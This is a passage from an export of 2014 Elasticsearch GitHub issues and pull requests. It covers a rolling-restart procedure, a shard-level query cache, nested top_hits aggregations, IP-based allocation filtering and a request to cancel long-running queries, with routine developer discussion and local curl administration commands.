</comment><comment author="areek" created="2014-08-20T15:43:09Z" id="52797123">Closed in favour of https://github.com/elasticsearch/elasticsearch/pull/7353
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Create a cluster restart doc page</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7169</link><project id="" key="" /><description>Currently, cluster rolling restart process is documented as part of the upgrade process.
http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/setup-upgrade.html#rolling-upgrades
Would be great to add a doc page specific to performing a full cluster restart that is not part of the upgrade steps.
</description><key id="39580977">7169</key><summary>Create a cluster restart doc page</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/ppf2/following{/other_user}', u'events_url': u'https://api.github.com/users/ppf2/events{/privacy}', u'organizations_url': u'https://api.github.com/users/ppf2/orgs', u'url': u'https://api.github.com/users/ppf2', u'gists_url': u'https://api.github.com/users/ppf2/gists{/gist_id}', u'html_url': u'https://github.com/ppf2', u'subscriptions_url': u'https://api.github.com/users/ppf2/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/7216393?v=4', u'repos_url': u'https://api.github.com/users/ppf2/repos', u'received_events_url': u'https://api.github.com/users/ppf2/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/ppf2/starred{/owner}{/repo}', u'site_admin': False, u'login': u'ppf2', u'type': u'User', u'id': 7216393, u'followers_url': u'https://api.github.com/users/ppf2/followers'}</assignee><reporter username="">ppf2</reporter><labels><label>adoptme</label><label>docs</label></labels><created>2014-08-06T01:05:47Z</created><updated>2016-11-25T18:26:26Z</updated><resolved>2016-11-25T18:26:26Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="ppf2" created="2014-08-06T22:34:12Z" id="51407059">Something like this (first draft) for the rolling restart process for a cluster:

1) Disable shard allocation (as a best practice, disable allocation so that Elasticsearch will not attempt to reallocate shards and waste I/O when each node is stopped and started).

```
curl -XPUT localhost:9200/_cluster/settings -d '{
                "transient" : {
                    "cluster.routing.allocation.enable" : "none"
                }
        }'
```

2) Start with the dedicated master nodes (then move on to the data nodes), shut down a single node within the cluster. You can run the `curl -XPOST 'http://localhost:9200/_cluster/nodes/_local/_shutdown'` command locally on the node (remember to update the command to reference the right HTTP port number for the node) or `sudo service elasticsearch stop`, etc..
3) Start the node back up and _confirm that it has rejoined the cluster_ (via Marvel, cat nodes API, etc..)
4) Repeat steps 2-3 for the remaining nodes, i.e. stop and restart each node and confirm that it can rejoin the cluster.
5) When this is done on all nodes, enable shard allocation.

```
   curl -XPUT localhost:9200/_cluster/settings -d '{
                "transient" : {
                    "cluster.routing.allocation.enable" : "all"
                }
        }'
```

Confirm that the shards are properly allocated on all nodes.
</comment><comment author="shtratos" created="2014-08-22T16:57:34Z" id="53089146">Does this process address the issue described here?
http://elasticsearch-users.115913.n3.nabble.com/Restarting-an-active-node-without-needing-to-recover-all-data-remotely-td4039346.html

Will it work if documents are being indexed during rolling cluster restart?
</comment><comment author="clintongormley" created="2016-11-25T18:26:26Z" id="263008197">Done</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Benchmarks: Re-factored benchmark infra</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7168</link><project id="" key="" /><description>Major re-factoring to use a dual-channel strategy for executing
benchmarks. Uses cluster metadata for managing lifecycle events, but
transport channel to send benchmark definitions and results between
master and executor nodes.
</description><key id="39577653">7168</key><summary>Benchmarks: Re-factored benchmark infra</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/imotov/following{/other_user}', u'events_url': u'https://api.github.com/users/imotov/events{/privacy}', u'organizations_url': u'https://api.github.com/users/imotov/orgs', u'url': u'https://api.github.com/users/imotov', u'gists_url': u'https://api.github.com/users/imotov/gists{/gist_id}', u'html_url': u'https://github.com/imotov', u'subscriptions_url': u'https://api.github.com/users/imotov/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/655851?v=4', u'repos_url': u'https://api.github.com/users/imotov/repos', u'received_events_url': u'https://api.github.com/users/imotov/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/imotov/starred{/owner}{/repo}', u'site_admin': False, u'login': u'imotov', u'type': u'User', u'id': 655851, u'followers_url': u'https://api.github.com/users/imotov/followers'}</assignee><reporter username="">aleph-zero</reporter><labels /><created>2014-08-06T00:00:00Z</created><updated>2014-09-08T19:14:20Z</updated><resolved>2014-08-15T19:52:05Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-08-18T15:56:02Z" id="52512531">The reason why I suggested to put all this into ClusterState is to have a single place where this information resides to actually recover from situations when nodes join / leave the cluster to make sure that the actual benchmarks can be cleaned up in any situations. It is in-fact the same reason why  snapshot and restore is in there while we try to make sure to clean things up and cancel etc. to gain robustness. My major concern back when we removed this feature from the releases was that I didn't feel comfortable with our behavior in failure situations when things get started, stopped, cancled etc. I wanted to have a synced place where we make the decisions (master) and if nodes drop out and rejoin they get a consistent state and then they can react to it as well as a state that is consistent with the nodes in the cluster.

I spoke to igor today and I think we have the need for a more generic river cluster state give that pattern seems to emerge. I don't think we need to hold this feature off until we refactored something out so keeping it in the clusterstate seems to me the right thing to do and igor agreed on our call. Yet, a big TODO shoudl be in the code to more this to a more generic synced update mechanism that is not necessarily persistent and not necessarily tied to the cluster state. 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add a request level flag to control Query Cache</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7167</link><project id="" key="" /><description>A request level flag, defaults to be unset, to control the query cache. When not set, it defaults to the index level settings, when explicitly set, will override the index level setting
</description><key id="39536897">7167</key><summary>Add a request level flag to control Query Cache</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">kimchy</reporter><labels><label>:Cache</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-05T16:28:41Z</created><updated>2015-06-07T12:29:18Z</updated><resolved>2014-08-05T16:34:31Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-05T16:32:17Z" id="51223476">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Indexing compound json with same attributes causes ES to index first value</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7166</link><project id="" key="" /><description>```
PUT /x/p/1
{
  "prof": {
    "first_seen": 1406941439263,
    "last_update": 1406941439263,
    "amb1": {
      "os": "Android",
      "device_model": "GT-I9100",
      "accounts": "17067024",
      "language": "en-gb",
      "device_brand": "Samsung",
      "os_version": "Android-4.1",
      "country": "IS"
    },
    "amb2": {
      "os": "iOS",
      "device_model": "iPhone5",
      "device_brand": "Apple",
      "os_version": "iOS-5.1",
      "country": "IL"
    }
  }
}
```

Search

```
GET /x/_count?q=country:IL
```

-&gt; 

```
{"count":0,"_shards":{"total":20,"successful":20,"failed":0}}
```

and

```
GET /x/_count?q=country:IS
```

-&gt;

{"count":1,"_shards":{"total":20,"successful":20,"failed":0}}
</description><key id="39526882">7166</key><summary>Indexing compound json with same attributes causes ES to index first value</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">rotemfogel</reporter><labels /><created>2014-08-05T14:52:59Z</created><updated>2014-08-05T15:23:10Z</updated><resolved>2014-08-05T15:23:10Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-05T15:23:10Z" id="51213043">@rotemfogel use the full path to your fields, eg:

```
GET /x/_count?q=amb1.country:IL
```
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Resolve wording inconsistency</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7165</link><project id="" key="" /><description>AND and OR filter docs talk about different targets for the operators. I
believe that both should be described in terms of modifying other 'filters'.
I also added articles for easier (human) parsing. This fixes #4762
</description><key id="39516880">7165</key><summary>Resolve wording inconsistency</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">konradkonrad</reporter><labels /><created>2014-08-05T13:11:10Z</created><updated>2014-08-06T17:33:34Z</updated><resolved>2014-08-05T15:17:44Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-05T15:17:20Z" id="51212251">Thanks @konradkonrad, merged.

By the way, I'd recommend using the `bool` filter instead of `and` and `or`... it's smarter, and you'll get better performance.
</comment><comment author="konradkonrad" created="2014-08-06T17:33:00Z" id="51368657">thx for merge and enlightment, @clintongormley :)
I found this after your remark: http://www.elasticsearch.org/blog/all-about-elasticsearch-filter-bitsets/
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Properly support top_hits aggregation in a nested and reverse_nested aggregations.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7164</link><project id="" key="" /><description>At the moment the `top_hits` aggregation fails if it is being put in a nested or reverse_nested aggregations. This PR add proper support for nested inner objects being emitted as hits in the `top_hits` aggregator. All the known fetch phase features are supported.

This PR adds fetch infrastructure to get #3022 in as well.
</description><key id="39516244">7164</key><summary>Properly support top_hits aggregation in a nested and reverse_nested aggregations.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/martijnvg/following{/other_user}', u'events_url': u'https://api.github.com/users/martijnvg/events{/privacy}', u'organizations_url': u'https://api.github.com/users/martijnvg/orgs', u'url': u'https://api.github.com/users/martijnvg', u'gists_url': u'https://api.github.com/users/martijnvg/gists{/gist_id}', u'html_url': u'https://github.com/martijnvg', u'subscriptions_url': u'https://api.github.com/users/martijnvg/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/580421?v=4', u'repos_url': u'https://api.github.com/users/martijnvg/repos', u'received_events_url': u'https://api.github.com/users/martijnvg/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/martijnvg/starred{/owner}{/repo}', u'site_admin': False, u'login': u'martijnvg', u'type': u'User', u'id': 580421, u'followers_url': u'https://api.github.com/users/martijnvg/followers'}</assignee><reporter username="">martijnvg</reporter><labels><label>:Aggregations</label><label>bug</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-08-05T13:02:47Z</created><updated>2017-03-31T10:06:20Z</updated><resolved>2014-10-09T07:52:11Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="brusic" created="2014-08-05T22:26:38Z" id="51269240">Excited about the progress towards #3022 . Thanks!
</comment><comment author="jpountz" created="2014-08-11T08:30:51Z" id="51753703">@martijnvg Left some comments/questions, mostly about how it works with several levels of nested docs.
</comment><comment author="martijnvg" created="2014-08-13T21:42:37Z" id="52115728">@jpountz I updated the PR and I combined the `nestedPath` and `nestedOffset` fields in `SearchHit` into `NestedIdentity` class, which allows one the exactly identify the nested inner hit from the _source.

Lets say there is a `parent` type that has a `children` nested object field then a child hit can look like this:

```
{
  "_id" : "1", &lt;--- id of the main document
  "_nested" : {
     "field" : "children",  &lt;--- the field in the _source
     "offset" : 2  &lt;--- The offset in the _source field's array field
  }
   "_source" : ... 
}
```

Lets say in addition inside the the `children` nested object field there is another nested object field named `grand_children` then a grand child hit can look like this:

```
{
  "_id" : "1", &lt;--- id of the main document
  "_nested" : {
     "field" : "children",  &lt;--- the first level field in the _source
     "offset" : 2  &lt;--- The first level offset in the _source field's array field
     "_nested" : {
         "field" : "grand_children", &lt;--- the second level field in the _source
         "offset" : "0" &lt;--- The second level offset in the _source field's array field
     }
  }
   "_source" : ... 
}
```

The `_nested` metadata in a hit explains nested level by nested level how to fetch the inner object from the _source. Together the the `_id` the `_nested` field is unique identifier.

With this in place even if the _source isn't requested, the actual nested inner objects can be retrieved later on. For example via the get api.
</comment><comment author="martijnvg" created="2014-08-29T20:59:30Z" id="53929201">@jpountz I updated the PR and split up the createNestedSearchHit method and drop the usage of filter cache and start the use fixed bitset cache instead.
</comment><comment author="jpountz" created="2014-10-07T16:21:08Z" id="58211887">@martijnvg LGTM I just left a comment about a remaining strack trace printing, and an idea that could hopefully help make looking up the parent object mapper cleaner, but it shouldn't block this change.
</comment><comment author="martijnvg" created="2014-10-07T16:33:36Z" id="58213943">@jpountz Many thanks for the review. If I manage to get the tracking of the parent object mapper in without to much changes then I'll push it as part of this PR, otherwise I'll open a new PR for this.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>h1986</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7163</link><project id="" key="" /><description /><key id="39516054">7163</key><summary>h1986</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">georgiobechara</reporter><labels /><created>2014-08-05T13:00:16Z</created><updated>2014-08-05T13:25:11Z</updated><resolved>2014-08-05T13:25:11Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dakrone" created="2014-08-05T13:25:11Z" id="51196266">Hi @georgiobechara , I am assuming this was opened in error, so I am closing it.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Issues with index routing allocation in 1.3.1</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7162</link><project id="" key="" /><description>I noticed an issue after upgrading from 0.90.9 to 1.3.1 that the index.routing.allocation.include._ip setting per index is not being properly handled.  I have used this setting in the past to move indices to an archiving server for long term storage (outside of the cluster).

In  the past the past I have been able to do the following:

Pre-move settings:

``` perl
'index' =&gt; {
    'routing' =&gt; {
        'allocation' =&gt; {
            'include' =&gt; {
                'tag' =&gt; 'storage',
            },
            'total_shards_per_node' =&gt; '2'
        }
    }
}
```

Move settings:

``` perl
'index' =&gt; {
    'routing' =&gt; {
        'allocation' =&gt; {
            'include' =&gt; {
                'tag' =&gt; '',
                '_ip' =&gt; '192.168.0.51',
            },
            'total_shards_per_node' =&gt; '999'
        }
    }
}
```

This would force one copy of each shard to migrate to the archiving server from the storage cluster.

Now in 1.3.1 the shards do not move at all with these settings, instead I have to set the following:

``` perl
'index' =&gt; {
    'routing' =&gt; {
        'allocation' =&gt; {
            'include' =&gt; {
                'tag' =&gt; 'storage,backup',
                '_ip' =&gt; '192.168.0.51',
            },
            'total_shards_per_node' =&gt; '999'
        }
    }
}
```

I did a quick test and it does look like if I do not provide the _ip setting, but only use the tags setting the migration works as intended.  This leads me to believe that the _ip field is being completely ignored.

In my use case I can't rely on the backup tag since I will have more than one backup server (using that tag), but need all of the data to go to a single server (ie need _ip, _host, etc).

Unfortunately, I was running on an old cluster for awhile so I am not sure  exactly where this broke at. But would have been somewhere between 0.90.9 and 1.3.1.
</description><key id="39514293">7162</key><summary>Issues with index routing allocation in 1.3.1</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/imotov/following{/other_user}', u'events_url': u'https://api.github.com/users/imotov/events{/privacy}', u'organizations_url': u'https://api.github.com/users/imotov/orgs', u'url': u'https://api.github.com/users/imotov', u'gists_url': u'https://api.github.com/users/imotov/gists{/gist_id}', u'html_url': u'https://github.com/imotov', u'subscriptions_url': u'https://api.github.com/users/imotov/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/655851?v=4', u'repos_url': u'https://api.github.com/users/imotov/repos', u'received_events_url': u'https://api.github.com/users/imotov/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/imotov/starred{/owner}{/repo}', u'site_admin': False, u'login': u'imotov', u'type': u'User', u'id': 655851, u'followers_url': u'https://api.github.com/users/imotov/followers'}</assignee><reporter username="">JamesDooley</reporter><labels /><created>2014-08-05T12:36:36Z</created><updated>2014-08-20T15:45:44Z</updated><resolved>2014-08-20T15:45:44Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="JamesDooley" created="2014-08-06T12:40:47Z" id="51328673">I did some additional testing in my dev cluster today. It looks like _host, _name, _id all appear to work properly.

Ip specifically seems to be the issue. Looking at the node status I am seeing that the ip is set to 127.0.0.1 on the archive server, in production. But the transport and http are both set to the private IP 192.168.0.51.

``` json
{
  "cluster_name" : "-",
  "nodes" : {
    "bR6msifgSL-yibrS6wYFdg" : {
      "name" : "Archive 1",
      "transport_address" : "inet[/192.168.0.51:9300]",
      "host" : "-",
      "ip" : "127.0.0.1",
      "version" : "1.3.1",
      "build" : "2de6dc5",
      "http_address" : "inet[/192.168.0.51:9200]",
      "attributes" : {
        "tag" : "backup",
        "master" : "false"
      }
    }
  }
}
```

The only setting that I have (related to ip addresses) in my configuration for that node is the network.publish_host. This setting is used in both the production and dev environments. The only difference is that the dev environment has a publicly routeable ip, the production environment only has private IP addresses.
</comment><comment author="imotov" created="2014-08-18T22:51:07Z" id="52566599">@JamesDooley the allocation filtering mechanism is using host address of a node to check if a shard should be allocated on this node or not. This is the same address that is getting returned by node info in the `ip` field, which is `127.0.0.1` in your case. When node starts, this address is obtained by [InetAddress.html#getLocalHost](http://docs.oracle.com/javase/7/docs/api/java/net/InetAddress.html#getLocalHost%28%29) method. So, the issue here is why this method returns you `127.0.0.1` instead of non-loopback IP address.
</comment><comment author="imotov" created="2014-08-20T15:45:42Z" id="52797464">Since it looks like network configuration issue rather than an elasticsearch issue, I am going to close it. Please feel free to reopen it if you have any additional details. Thanks!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Query Cache: Support shard level query response caching</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7161</link><project id="" key="" /><description>The query cache allow to cache the (binary serialized) response of the shard level query phase execution based on the actual request as the key. The cache is fully coherent with the semantics of NRT, with a refresh (that actually ended up refreshing) causing previous cached entries on the relevant shard to be invalidated and eventually evicted.

This change enables query caching as an opt in index level setting, called `index.cache.query.enable` and defaults to `false`. The setting can be changed dynamically on an index. The cache is only enabled for search requests with search_type count.

The indices query cache is a node level query cache. The `indices.cache.query.size` controls what is the size (bytes wise) the cache will take, and defaults to `1%` of the heap. Note, this cache is very effective with small values in it already. There is also the advanced option to set `indices.cache.query.expire` that allow to control after a certain time of inaccessibility the cache will be evicted.

Note, the request takes the search "body" as is (bytes), and uses it as the key. This means same JSON but with different key order will constitute different cache entries.

This change includes basic stats (shard level, index/indices level, and node level) for the query cache, showing how much is used and eviction rates.

While this is a good first step, and the goal is to get it in, there are a few things that would be great additions to this work, but they can be done as additional pull requests:
- More stats, specifically cache hit and cache miss, per shard.
- Request level flag, defaults to "not set" (inheriting what the setting is).
- Allowing to change the cache size using the cluster update settings API
- Consider enabling the cache to query phase also when asking hits are involved, note, this will only include the "top docs", not the actual hits.
- See if there is a performant manner to solve the "out of order" of keys in the JSON case.
- Maybe introduce a filter element, that is outside of the request, that is checked, and if it matches all docs in a shard, will not be used as part of the key. This will help with time based indices and moving windows for shards that fall "inside" the window to be more effective caching wise.
- Add a more infra level support in search context that allows for any element to mark the search as non deterministic (on top of the support for "now"), and use it to not cache search responses.
</description><key id="39506206">7161</key><summary>Query Cache: Support shard level query response caching</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">kimchy</reporter><labels><label>:Cache</label><label>feature</label><label>release highlight</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-05T10:38:28Z</created><updated>2015-06-06T18:23:00Z</updated><resolved>2014-08-05T15:46:40Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-05T11:23:45Z" id="51184410">I left some minor comments on the PR but overall it looks good.

I would add an item to the TODO list that looks important to me: a more generic ability to disable the query cache from the various query/filter parsers so that the random function score could prevent the query from being cached when there is no explicit seed.
</comment><comment author="kimchy" created="2014-08-05T11:38:10Z" id="51185520">@jpountz addressed your comments, ready for another round...
</comment><comment author="clintongormley" created="2014-08-05T11:52:35Z" id="51186636">If the query cache already takes refreshes into account, why do we need the `expire` setting?

&gt; See if there is a performant manner to solve the "out of order" of keys in the JSON case.

This could also be handled client side, ie: if a cache flag is passed, then we generate "canonical" JSON (ie keys are emitted in sorted order)
</comment><comment author="kimchy" created="2014-08-05T11:58:20Z" id="51187054">&gt; If the query cache already takes refreshes into account, why do we need the expire setting?

I don't see a big use case for it, just for completeness sake to be honest. Imagine an index that doesn't change, but still wanting to expire based on time for some reason, and not just based on size.
</comment><comment author="dakrone" created="2014-08-05T13:23:12Z" id="51196056">I think we should add to the TODOs returning a key in the response whether the response was served from the cache or not, something like `"cache_hit": true`. It makes 3rd-party tracking of cache hits/misses easier.
</comment><comment author="kimchy" created="2014-08-05T13:24:18Z" id="51196160">@dakrone agreed, that would be nice as well (and it needs to be on the shard level element, btw, so I would opt for only setting it if its there)
</comment><comment author="jpountz" created="2014-08-05T15:25:07Z" id="51213309">LGTM
</comment><comment author="dakrone" created="2014-08-05T15:42:29Z" id="51215875">@kimchy left one comment about the clean_interval setting name, other than that LGTM.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>`key_as_string` only shown when format specified in terms agg</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7160</link><project id="" key="" /><description>The key_as_string field is now not shown in the terms aggregation for long and double fields unless the format parameter is specified

Closes #7125
</description><key id="39501893">7160</key><summary>`key_as_string` only shown when format specified in terms agg</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">colings86</reporter><labels><label>:Aggregations</label><label>bug</label><label>v1.3.2</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-05T09:39:58Z</created><updated>2015-06-07T19:11:51Z</updated><resolved>2014-08-05T09:42:56Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-05T09:41:07Z" id="51174873">LGTM
</comment><comment author="colings86" created="2014-08-05T09:41:32Z" id="51174909">Similar to https://github.com/colings86/elasticsearch/commit/2be6329317aa4f36c2d802032b4e9f039d9c28bf
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Automatic verification of all files that are being snapshotted with Snapshot/Restore</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7159</link><project id="" key="" /><description>Adds automatic verification of all files that are being snapshotted. Closes #5593
</description><key id="39476756">7159</key><summary>Automatic verification of all files that are being snapshotted with Snapshot/Restore</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/imotov/following{/other_user}', u'events_url': u'https://api.github.com/users/imotov/events{/privacy}', u'organizations_url': u'https://api.github.com/users/imotov/orgs', u'url': u'https://api.github.com/users/imotov', u'gists_url': u'https://api.github.com/users/imotov/gists{/gist_id}', u'html_url': u'https://github.com/imotov', u'subscriptions_url': u'https://api.github.com/users/imotov/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/655851?v=4', u'repos_url': u'https://api.github.com/users/imotov/repos', u'received_events_url': u'https://api.github.com/users/imotov/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/imotov/starred{/owner}{/repo}', u'site_admin': False, u'login': u'imotov', u'type': u'User', u'id': 655851, u'followers_url': u'https://api.github.com/users/imotov/followers'}</assignee><reporter username="">imotov</reporter><labels><label>:Snapshot/Restore</label><label>breaking</label><label>enhancement</label><label>resiliency</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-05T01:13:28Z</created><updated>2015-06-06T16:43:21Z</updated><resolved>2014-08-20T01:51:33Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="kimchy" created="2014-08-05T12:46:52Z" id="51192121">it looks good to me, maybe @rmuir can have a look at that verifying index input?
</comment><comment author="rmuir" created="2014-08-19T02:52:50Z" id="52584407">looks good here. sorry for the delay in review!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Update forbidden-apis to 1.6.1</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7158</link><project id="" key="" /><description>Forbidden APIs was released in version 1.6.1 (1.6 had broken Maven decriptor). The new version allows to skip checks with:
`mvn -Dforbiddenapis.skip=true test`
</description><key id="39469730">7158</key><summary>Update forbidden-apis to 1.6.1</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/rmuir/following{/other_user}', u'events_url': u'https://api.github.com/users/rmuir/events{/privacy}', u'organizations_url': u'https://api.github.com/users/rmuir/orgs', u'url': u'https://api.github.com/users/rmuir', u'gists_url': u'https://api.github.com/users/rmuir/gists{/gist_id}', u'html_url': u'https://github.com/rmuir', u'subscriptions_url': u'https://api.github.com/users/rmuir/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/504194?v=4', u'repos_url': u'https://api.github.com/users/rmuir/repos', u'received_events_url': u'https://api.github.com/users/rmuir/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/rmuir/starred{/owner}{/repo}', u'site_admin': False, u'login': u'rmuir', u'type': u'User', u'id': 504194, u'followers_url': u'https://api.github.com/users/rmuir/followers'}</assignee><reporter username="">uschindler</reporter><labels><label>enhancement</label></labels><created>2014-08-04T22:58:56Z</created><updated>2014-10-28T11:11:31Z</updated><resolved>2014-08-15T14:28:27Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Find and kill long running queries</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7157</link><project id="" key="" /><description>We run all queries with `timeout=160s`, but I understand this only really bounds the collection phase of the search?

We had someone run a query using aggregations today over billions of records, which brought the cluster down.
The cluster never OOM'd, but it did run into constant GC as the heap got full.
Another query was run again over potentially huge amounts of data. The cluster had indexing disabled as it was recovering from the previous event, and since the query was run it's been at 100% CPU for about 40 minutes now. The query, afaict, is still running. But we have no way of knowing what it is, and no way to kill it other than restarting the entire cluster.

I'd like to request a feature that lists all queries that are currently executing on every node, as well a way to kill them while they're in progress.
</description><key id="39469167">7157</key><summary>Find and kill long running queries</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">avleen</reporter><labels /><created>2014-08-04T22:50:15Z</created><updated>2014-08-05T13:03:32Z</updated><resolved>2014-08-04T23:56:05Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="imotov" created="2014-08-04T23:56:02Z" id="51133674">This looks like a duplicate of #4586 and #6914. So, I am going to close it. Please feel free to reopen it if I am wrong and you think that this issue is substantially different.  
</comment><comment author="clintongormley" created="2014-08-05T11:37:21Z" id="51185468">@avleen just to add another comment to this ticket: the circuit breakers in 1.3 should handle this better than the version you're running, and the circuit breakers in 1.4 better still.
</comment><comment author="kimchy" created="2014-08-05T11:40:27Z" id="51185705">aye, that was my thought, better timeout logic is very important (to properly bound requests across all its phase of execution, and make them cancelable), but the circuit breaker on 1.3 should do a good job at not allowing to load expensive data structure that can't be loaded, and the improved circuit breaker in 1.4 will allow to break on expensive requests that require too much resources for the request level (like the resources required to just compute sig terms).
</comment><comment author="avleen" created="2014-08-05T13:03:32Z" id="51193886">Fantastic. Thanks folks. We upgraded to 1.3 while the cluster was down.
Fingers crossed!
On Aug 5, 2014 7:40 AM, "Shay Banon" notifications@github.com wrote:

&gt; aye, that was my thought, better timeout logic is very important (to
&gt; properly bound requests across all its phase of execution, and make them
&gt; cancelable), but the circuit breaker on 1.3 should do a good job at not
&gt; allowing to load expensive data structure that can't be loaded, and the
&gt; improved circuit breaker in 1.4 will allow to break on expensive requests
&gt; that require too much resources for the request level (like the resources
&gt; required to just compute sig terms).
&gt; 
&gt; ## 
&gt; 
&gt; Reply to this email directly or view it on GitHub
&gt; https://github.com/elasticsearch/elasticsearch/issues/7157#issuecomment-51185705
&gt; .
